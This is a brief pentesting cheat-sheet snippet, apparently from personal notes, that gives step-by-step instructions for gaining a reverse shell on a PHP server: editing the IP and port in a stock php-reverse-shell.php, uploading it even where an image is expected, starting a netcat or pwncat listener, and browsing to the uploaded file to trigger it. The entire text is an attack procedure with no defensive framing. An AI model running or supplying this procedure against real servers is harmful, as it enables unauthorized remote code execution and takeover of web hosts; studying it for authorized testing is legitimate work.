### If you have the ability to upload on a PHP server
```
1. Change the IP/Port address in /usr/share/webshells/php/php-reverse-shell.php and upload the file (even if it requests an image)
2. Start a listener on the Port with either
nc -nlvp PORT
pwncat -l PORT
3. Upload the file and navigate to where it would be presented on the site
4. Check your listener, you should have a reverse shell
```
